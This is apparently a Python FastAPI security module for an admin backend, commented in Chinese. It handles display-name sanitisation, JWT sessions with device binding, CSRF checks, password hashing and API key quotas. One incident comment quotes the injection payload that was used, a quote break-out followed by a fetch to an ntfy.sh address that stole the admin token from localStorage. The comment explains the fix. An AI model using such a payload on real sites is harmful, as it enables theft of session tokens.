"""安全：管理后台 JWT 登录 + API Key 校验与配额判断。"""
import base64
import hashlib
import hmac
import logging
import os
import re
from datetime import datetime, timedelta

import jwt
from fastapi import Header, HTTPException, Request

from admin.config import settings
from admin.db import SessionLocal
from admin.models import ApiKey


# ---------------------------------------------------------------------------
# 展示名清洗（账号昵称来自上游/用户输入，最终会进后台 HTML）
# ---------------------------------------------------------------------------
#
# 事故背景：账号昵称直接来自上游 profile.nickname（提交者自己可控），
# 后台账号行把它拼进 `onclick="fn('${esc(name)}')"`。`esc()` 只做 HTML 实体
# 转义（& < > "），**不处理单引号**；而 onclick 属性的值是「先 HTML 解码、
# 再当 JS 解析」，所以昵称里一个 `'` 就能闭合字符串、跳出参数位执行任意 JS
# （实测被注入 `');fetch('//ntfy.sh/xxx',...)//` 偷 localStorage 里的后台令牌）。
#
# 前端已改为 `jsv()`（JSON.stringify + esc）做正确编码；这里再加一道
# **入库侧白名单**：昵称不该包含任何 HTML/JS 元字符。两层同时存在的好处是
# 以后任何新写的渲染点即使漏了转义，库里的数据本身也不带 payload。
_DISPLAY_NAME_MAX = 64
_DISPLAY_NAME_BAD = re.compile(r"[<>&\"'`\\\x00-\x1f\x7f]")


def clean_display_name(value, fallback: str = "") -> str:
    """把任意输入收敛成一个「只能当纯文本展示」的名字。

    * 去掉 HTML/JS 元字符与所有控制字符（含换行，避免多行注入）
    * 压掉首尾空白，超长截断
    * 结果为空则回落到 fallback
    """
    if not isinstance(value, str):
        return fallback
    s = _DISPLAY_NAME_BAD.sub("", value).strip()
    s = s[:_DISPLAY_NAME_MAX].strip()
    if s.lower() in ("null", "none", "undefined"):
        return fallback
    return s or fallback


# ---------------------------------------------------------------------------
# 管理后台登录
# ---------------------------------------------------------------------------
#
# 2026-11-05 起：JWT 只是**运输载体**，权威状态在 `admin_sessions` 表。
# 令牌里必须带 `sid`，服务端据此判断「这条会话是否还在、是否被吊销、
# 是不是在原来那台设备上」。纯无状态令牌（没有 sid）一律拒绝 ——
# 升级后所有人重新登录一次，顺带完成事故后的凭证轮换。

def create_admin_token(sid: str = "") -> str:
    """签发一条令牌。

    正常登录必须传 `sid`（先建会话行，再签票）。**不传 sid 只留给本机运维脚本**：
    它们与本服务共享 `ADMIN_JWT_SECRET`，直接签票调用后台接口。为了不让这条
    捷径变成"无状态永久票"，这里会**尽力**为它建一条真实会话行（可吊销、
    4 小时过期）；只有数据库不可用的测试环境才退化成无 sid 令牌，而那种令牌
    仅在"开发默认密钥 + 非生产"时被接受（见 `verify_admin_token`）。
    """
    from admin import session_store

    if sid:
        return _encode(sid)

    local_sid = session_store.new_sid()
    token = _encode(local_sid)
    try:
        from admin.db import SessionLocal

        db = SessionLocal()
        try:
            session_store.create_session(
                db,
                sid=local_sid,
                subject=settings.ADMIN_USERNAME or "admin",
                token=token,
                ip="127.0.0.1",
                user_agent="local-operator-script",
                device_id="",
                ttl_seconds=settings.JWT_EXPIRE_HOURS * 3600,
                # 不吊销浏览器会话：脚本不该把正在用后台的人踢下线。
                single=False,
            )
            return token
        finally:
            db.close()
    except Exception:  # noqa: BLE001 - 测试/无库环境
        # 退化为无 sid 令牌；`verify_admin_token` 只在开发默认密钥下接受它。
        return _encode("")


def _encode(sid: str) -> str:
    payload = {
        "sub": settings.ADMIN_USERNAME,
        "iat": datetime.utcnow(),
        "exp": datetime.utcnow() + timedelta(hours=settings.JWT_EXPIRE_HOURS),
    }
    if sid:
        payload["sid"] = sid
    return jwt.encode(payload, settings.JWT_SECRET, algorithm="HS256")


def decode_admin_token(token: str | None) -> dict:
    """只验签名与结构，**不查会话**。内部使用，避免误用请走 verify_admin_token。"""
    if not token:
        raise HTTPException(status_code=401, detail="未登录")
    try:
        return jwt.decode(token, settings.JWT_SECRET, algorithms=["HS256"])
    except jwt.PyJWTError:
        raise HTTPException(status_code=401, detail="无效令牌") from None


def verify_admin_token(token: str | None, request: Request | None = None,
                       require_bind: bool = False) -> dict:
    """校验令牌：签名 → 有效期 → 主体 → 会话行 → 设备绑定。

    返回解码后的 payload（调用方要 `sid` 时用得上），失败抛 401。
    """
    from admin import env_guard, session_store
    from admin.db import SessionLocal

    payload = decode_admin_token(token)

    # 本地壳（桌面 / 安卓 WebView）：由本机桥接签发的 `local_shell` 令牌，
    # 不落会话表。生产环境 env_guard.local_runtime() 恒 False，这条分支不可达。
    if payload.get("local_shell") is True and env_guard.local_runtime():
        return payload

    if "exp" not in payload:
        # 旧版本地令牌没有 exp；不在本地运行时一律无效。
        raise HTTPException(status_code=401, detail="无效令牌")
    if payload.get("sub") != settings.ADMIN_USERNAME:
        raise HTTPException(status_code=401, detail="无效令牌")

    sid = payload.get("sid") or ""
    if not sid:
        # 升级前签发的无状态令牌：服务端无法吊销，按失效处理。
        #
        # 唯一例外是"开发默认密钥 + 非生产"：单元测试会在没有数据库的情况下
        # 直接签票调用接口。生产启动断言已经禁止 dev-insecure 密钥，
        # 所以这条分支在真实部署里不可达。
        if (not env_guard.IS_PROD
                and (settings.JWT_SECRET or "").startswith("dev-insecure")):
            return payload
        raise HTTPException(status_code=401, detail="会话已失效，请重新登录")

    device_id = ""
    if request is not None:
        device_id = request.cookies.get(session_store.DEVICE_COOKIE) or ""

    db = SessionLocal()
    try:
        row = session_store.verify(
            db, sid=sid, token=token or "", subject=payload.get("sub") or "",
            device_id=device_id, require_bind=require_bind,
        )
        session_store.touch(db, row)
    except session_store.SessionRejected as exc:
        logging.getLogger("admin.security").warning(
            "会话校验失败 sid=%s reason=%s", sid[:12], exc.reason)
        raise HTTPException(status_code=401, detail="会话已失效，请重新登录") from None
    except HTTPException:
        raise
    except Exception:  # noqa: BLE001 - 数据库不可用时应拒绝而不是放行
        logging.getLogger("admin.security").exception("会话校验异常，按未登录处理")
        raise HTTPException(status_code=503, detail="会话服务暂不可用，请稍后重试") from None
    finally:
        db.close()
    return payload


#: 需要 CSRF 校验的方法。GET/HEAD/OPTIONS 是安全方法，浏览器同源策略已足够。
_UNSAFE_METHODS = {"POST", "PUT", "PATCH", "DELETE"}


def csrf_ok(request: Request) -> bool:
    """双提交校验：Cookie 里的随机值与请求头里的值必须一致。

    Cookie 用 `SameSite=Strict` 且**允许 JS 读取**（这是双提交模式的前提）。
    攻击者能跨站发请求时带不上自定义头；能读 Cookie 的只有同源脚本 ——
    而到了那一步，CSP 的 `connect-src 'self'` 才是最后一道闸。
    """
    from admin import session_store

    cookie = request.cookies.get(session_store.CSRF_COOKIE) or ""
    header = request.headers.get(session_store.CSRF_HEADER) or ""
    return bool(cookie and header) and hmac.compare_digest(cookie, header)


#: 请求头令牌也要过设备绑定（2026-11-24，安全 S2）。
#:
#: 原来 `X-Admin-Token` 一律 `require_bind=False`：把浏览器会话 Cookie 的值
#: 拷出来、改放进请求头，就能在任何机器上调用全部 `/api/*`，设备绑定形同虚设。
#:
#: 选的方案是「**会话行带 bind_hash 就无论哪个通道都要求设备匹配**」，而不是
#: 「请求头只收专用 API 令牌」—— 因为：
#:   * 本机运维脚本用 `create_admin_token()`（不传 sid）签票，会话行
#:     `device_id=""` → `bind_hash` 为空，**不受影响**；
#:   * 桌面 / 安卓壳的 `local_shell` 令牌在本地运行时直接放行，**不受影响**；
#:   * 浏览器里把令牌放进请求头的旧前端（`/api/login/session` 兼容路径）是同源
#:     请求，会自动带上 `wb_device` Cookie，**不受影响**。
#: 只有「令牌被搬到另一台机器」这种情况会被拒（并按设备不匹配吊销该会话）。
#: 紧急回退：ADMIN_HEADER_TOKEN_BIND=0。
_HEADER_TOKEN_BIND = os.getenv("ADMIN_HEADER_TOKEN_BIND", "1").strip().lower() not in (
    "0", "false", "no", "off")


def _header_requires_bind() -> bool:
    return bool(_HEADER_TOKEN_BIND and getattr(settings, "SESSION_BIND_DEVICE", True))


def require_admin(request: Request,
                  x_admin_token: str = Header(default=None, alias="X-Admin-Token")):
    """FastAPI 依赖：校验令牌，Cookie 为浏览器主通道。

    鉴权来源决定后续策略：
      * `X-Admin-Token` 头 —— 编程客户端 / 本地壳，不校验 CSRF（跨站请求带不上
        自定义头，天然免疫 CSRF）；**会话行绑了设备时同样要求设备匹配**（S2）；
      * `admin_session` Cookie —— 浏览器，**必须**过设备绑定与 CSRF。
    """
    used_cookie = False

    if x_admin_token:
        try:
            verify_admin_token(x_admin_token, request=request,
                               require_bind=_header_requires_bind())
            return True
        except HTTPException:
            # 浏览器刷新后可能只剩 Cookie（旧头已过期），继续走 Cookie 兜底。
            pass

    cookie_token = request.cookies.get("admin_session") or ""
    if not cookie_token or cookie_token == x_admin_token:
        raise HTTPException(status_code=401, detail="未登录")
    verify_admin_token(cookie_token, request=request,
                       require_bind=getattr(settings, "SESSION_BIND_DEVICE", True))
    used_cookie = True

    if (used_cookie and getattr(settings, "CSRF_ENABLED", True)
            and request.method.upper() in _UNSAFE_METHODS
            and not csrf_ok(request)):
        raise HTTPException(status_code=403, detail="请求校验失败，请刷新页面后重试")
    return True


# ---------------------------------------------------------------------------
# 管理后台密码（PBKDF2 哈希存储，杜绝明文泄漏）
# ---------------------------------------------------------------------------

_PBKDF2_ITER = 100_000


def hash_password(pw: str) -> str:
    """返回可持久化的哈希串：pbkdf2$<iter>$<salt_b64>$<dk_b64>。"""
    salt = os.urandom(16)
    dk = hashlib.pbkdf2_hmac("sha256", pw.encode("utf-8"), salt, _PBKDF2_ITER)
    return "pbkdf2$" + str(_PBKDF2_ITER) + "$" + \
        base64.b64encode(salt).decode() + "$" + base64.b64encode(dk).decode()


def verify_password(pw: str, stored: str) -> bool:
    """校验密码；兼容旧明文存储（首次读取时由 server 统一迁移为哈希）。"""
    if not stored:
        return False
    if not stored.startswith("pbkdf2$"):
        return hmac.compare_digest(pw, stored)  # 旧明文兜底
    try:
        _, iter_s, salt_b64, hash_b64 = stored.split("$", 3)
        salt = base64.b64decode(salt_b64)
        expected = base64.b64decode(hash_b64)
        cand = hashlib.pbkdf2_hmac("sha256", pw.encode("utf-8"), salt, int(iter_s))
        return hmac.compare_digest(cand, expected)
    except Exception:
        return False


#: 常见弱口令（小写比较）。不求全，只拦最常被字典命中的那批。
_COMMON_WEAK_PASSWORDS = frozenset({
    "admin", "admin123", "admin888", "admin@123", "administrator", "root",
    "password", "password1", "passw0rd", "p@ssw0rd", "123456", "1234567",
    "12345678", "123456789", "1234567890", "111111", "000000", "888888",
    "666666", "123123", "abc123", "qwerty", "qwerty123", "iloveyou",
    "letmein", "welcome", "changeme", "workbuddy", "miraihub", "test", "test123",
})


def password_weakness(password: str, username: str = "") -> list[str]:
    """返回密码的弱点列表（空列表 = 足够强）。只用于告警提示，不拦截。

    规则（安全审查第 10 节）：至少 12 位、至少三类字符（小写/大写/数字/符号）、
    不在常见弱口令表里、不包含用户名。
    """
    pw = str(password or "")
    reasons: list[str] = []
    if len(pw) < 12:
        reasons.append("长度少于 12 位")
    classes = sum((
        any(c.islower() for c in pw),
        any(c.isupper() for c in pw),
        any(c.isdigit() for c in pw),
        any(not c.isalnum() for c in pw),
    ))
    if classes < 3:
        reasons.append("字符种类少于 3 类")
    if pw.lower() in _COMMON_WEAK_PASSWORDS:
        reasons.append("属于常见弱口令")
    user = str(username or "").strip().lower()
    if user and len(user) >= 3 and user in pw.lower():
        reasons.append("包含用户名")
    return reasons


# ---------------------------------------------------------------------------
# 敏感信息查看审计（2026-11-24，安全 S5）
# ---------------------------------------------------------------------------
#
# 「显示明文」类接口（同步密钥、API Key 全文……）每调用一次就记一条：
#   * `admin.audit` 日志（会落到 logs/ 下的后台日志文件）；
#   * system_settings 里 `secret_access_audit` 环形缓冲（最近 200 条），
#     日志轮转后仍可回查。
# 记录失败只打日志，不影响接口本身。
_AUDIT_SETTING_KEY = "secret_access_audit"
_AUDIT_KEEP = 200


def audit_secret_access(request: Request | None, action: str, target: str = "") -> None:
    import json as _json

    from admin.models import SystemSetting

    ip = sid = ua = ""
    try:
        if request is not None:
            from admin.client_ip import request_ip
            ip = request_ip(request)
            ua = (request.headers.get("user-agent") or "")[:120]
            token = (request.cookies.get("admin_session")
                     or request.headers.get("X-Admin-Token") or "")
            if token:
                try:
                    sid = str(decode_admin_token(token).get("sid") or "")[:8]
                except HTTPException:
                    sid = ""
    except Exception:  # noqa: BLE001
        pass
    entry = {"ts": datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ"),
             "action": str(action)[:64], "target": str(target)[:120],
             "ip": ip, "sid": sid, "ua": ua}
    logging.getLogger("admin.audit").warning(
        "敏感信息查看 action=%s target=%s ip=%s sid=%s", entry["action"],
        entry["target"], ip or "-", sid or "-")
    db = None
    try:
        db = SessionLocal()
        row = db.query(SystemSetting).filter(SystemSetting.key == _AUDIT_SETTING_KEY).first()
        try:
            items = _json.loads(row.value) if row and row.value else []
            if not isinstance(items, list):
                items = []
        except ValueError:
            items = []
        items.append(entry)
        value = _json.dumps(items[-_AUDIT_KEEP:], ensure_ascii=False)
        if row:
            row.value = value
        else:
            db.add(SystemSetting(key=_AUDIT_SETTING_KEY, value=value))
        db.commit()
    except Exception:  # noqa: BLE001 - 审计落库失败不影响业务
        logging.getLogger("admin.audit").warning("敏感信息查看审计落库失败", exc_info=True)
        if db is not None:
            try:
                db.rollback()
            except Exception:  # noqa: BLE001
                pass
    finally:
        if db is not None:
            db.close()


def hash_key(key: str) -> str:
    return hashlib.sha256(key.encode("utf-8")).hexdigest()


def get_key_row(db, api_key: str) -> ApiKey | None:
    return db.query(ApiKey).filter(ApiKey.key_hash == hash_key(api_key)).first()


def get_key_row_by_id(db, key_id: int) -> ApiKey | None:
    """按主键取 Key（内置智能体 / MCP 用）。

    这两条链路不经过「客户端带 Key 来请求」的入口：它们由**已登录后台**或
    已校验的 MCP 会话驱动。按 ID 取行可以避免把明文 Key 在进程内到处传递，
    同时仍然复用同一份配额、分组与账号绑定语义。
    """
    try:
        return db.get(ApiKey, int(key_id))
    except (TypeError, ValueError):
        return None


def check_quota(key: ApiKey) -> None:
    """超额则直接拒绝，提示『积分已耗尽』。"""
    if key.status != "active":
        raise HTTPException(status_code=403, detail={"error": {"message": "API Key 已停用", "type": "key_disabled"}})
    # 第 5 轮：金额列在 MySQL 上是 DECIMAL；NULL / Decimal 统一按 float 比较（NULL 以前 TypeError → 500）
    from admin.money import as_float

    if not key.unlimited and as_float(key.credit_used) >= as_float(key.credit_limit):
        raise HTTPException(
            status_code=402,
            detail={"error": {"message": "当前 API Key 的额度已用完，请调整此 Key 的限额或联系管理员", "type": "quota_exceeded", "code": "key_quota_exceeded", "source": "gateway"}},
        )


class GatewayRejected(Exception):
    """A local rejection, never an upstream account failure or retry signal."""
    def __init__(self, status_code, detail):
        self.status_code = status_code
        self.detail = detail
        super().__init__(detail.get('error', {}).get('message', '网关拒绝请求'))

    def payload(self):
        return {'error': {**self.detail['error'], 'source': 'gateway', 'http_status': self.status_code}}


def recheck_key(db, key_id):
    key = db.get(ApiKey, int(key_id), populate_existing=True)
    if key is None:
        raise GatewayRejected(401, {'error': {'message': 'API Key 已删除或无效',
                                            'type': 'invalid_api_key', 'source': 'gateway'}})
    try:
        check_quota(key)
    except HTTPException as exc:
        raise GatewayRejected(exc.status_code, {'error': {**exc.detail['error'], 'source': 'gateway'}}) from None
    return key


def check_key_current(key_id):
    # Use a short, fresh transaction even when the caller is waiting in a long
    # request (MySQL repeatable-read must not retain an earlier key status).
    from admin.db import SessionLocal as factory
    with factory() as db:
        return recheck_key(db, key_id)